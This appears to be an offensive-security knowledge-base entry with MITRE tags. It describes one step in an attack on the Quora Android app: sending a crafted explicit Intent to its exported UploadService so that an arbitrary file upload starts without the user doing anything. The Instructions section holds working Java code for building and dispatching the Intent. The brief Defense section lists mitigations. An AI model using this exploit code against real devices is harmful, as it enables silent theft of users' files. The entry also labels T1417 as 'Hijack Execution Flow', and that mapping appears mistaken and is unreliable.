---
id: proc-quora-send-intent
tags:
  - android
  - intent-hijacking
  - service-trigger
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1417]]'
updated_at: '2025-12-14T17:24:42.671Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[T1417]]'
---
# Send Intent to Trigger UploadService

## Summary

This procedure constructs and sends an explicit Intent to the exported UploadService, bundling the crafted parameters to initiate the arbitrary file upload.

## Description

The Intent uses the upload action, specifies the Quora package and service class, and includes extras for task class, charset, HTTP parameters, and the UploadTaskParameters. Calling startService() on a bound context triggers the service in the target app, causing the upload without user interaction.

## Requirements

1. Malicious app context (Activity or Service)
2. Crafted UploadTaskParameters from prior step
3. Target device with Quora app installed

## Defense

Defensive measures and detection strategies:

- Add exported=false or custom permissions to service
- Validate intent extras for malicious parameters (e.g., unexpected URLs)
- Use runtime protections like SELinux policies to restrict cross-app service calls

## Objectives

1. Build Intent with correct action and component
2. Bundle all necessary extras
3. Dispatch via startService to execute upload

## Instructions

### Step 1: Create Intent Base

**Context**: Set action and class.

```java
Intent intent = new Intent("net.gotev.uploadservice.action.upload");
intent.setClassName("com.quora.android", "net.gotev.uploadservice.UploadService");
```

> This targets the specific service in Quora.

### Step 2: Add Extras and Send

**Context**: Include parameters and start service.

```java
intent.putExtra("taskClass", "net.gotev.uploadservice.MultipartUploadTask");
intent.putExtra("multipartUtf8Charset", true);
intent.putExtra("httpTaskParameters", new HttpUploadTaskParameters());
intent.putExtra("taskParameters", params);
startService(intent);
```

> params is the UploadTaskParameters; monitor network for upload confirmation.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] - Execution

### Techniques

- [[T1417]] - Hijack Execution Flow

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[android]]
- [[intent-hijacking]]
